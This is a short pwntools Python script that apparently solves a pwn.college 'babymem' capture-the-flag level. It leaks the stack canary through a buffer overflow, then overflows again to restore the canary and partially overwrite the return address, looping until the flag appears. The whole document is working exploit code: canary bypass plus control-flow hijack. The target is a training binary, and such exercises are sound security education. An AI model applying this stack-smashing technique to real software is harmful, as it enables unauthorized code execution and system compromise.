from pwn import *

while True:
    p = process("/challenge/babymem_level14.1")
    p.sendline(b"500")
    ret_addr = 0x1413
    s=b"REPEATAA" + b"A"*(0xE0) + b"A"
    p.send(s)
    while True:
        cont = p.recvline()
        if cont.find(b"REPEATAA")!=-1:
            break
    start = cont.find(b"REPEATAA")
    cookie = bytearray(cont[start + 0xE8: start + 0xF0])
    cookie[0] = b'\x00'[0]
    icookie = int.from_bytes(cookie, "little")
    print(icookie)

    s = b"A"*0x1F8 + cookie + b"A"*0x8 + ret_addr.to_bytes(2,"little")
    p.sendline(b"900")
    p.send(s)
    all = p.recvall()
    print(all.decode(errors="ignore"))
    p.close()
    if all.find(b"pwn.college{") != -1:
        break
